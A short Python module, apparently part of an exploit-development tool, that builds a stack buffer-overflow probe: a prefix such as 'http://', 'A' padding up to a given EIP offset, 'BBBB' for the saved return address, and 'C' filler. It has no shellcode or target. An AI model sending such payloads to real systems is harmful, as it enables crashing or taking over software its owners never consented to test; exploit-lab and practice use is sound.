from __future__ import annotations

import argparse


def add_args(parser: argparse.ArgumentParser) -> None:
    parser.add_argument(
        "--prefix",
        default="http://",
        help="Bytes prepended before the overflow body (default: http://)",
    )
    parser.add_argument(
        "--offset",
        type=int,
        required=True,
        help="Offset to the saved EIP overwrite",
    )
    parser.add_argument(
        "--tail-length",
        type=int,
        default=4000,
        help="Number of C bytes after BBBB (default: 4000)",
    )


def build(args: argparse.Namespace) -> bytes:
    if args.offset < 0:
        raise ValueError("--offset must be zero or greater")
    if args.tail_length < 0:
        raise ValueError("--tail-length must be zero or greater")

    return (
        args.prefix.encode("latin-1")
        + (b"A" * args.offset)
        + b"BBBB"
        + (b"C" * args.tail_length)
    )
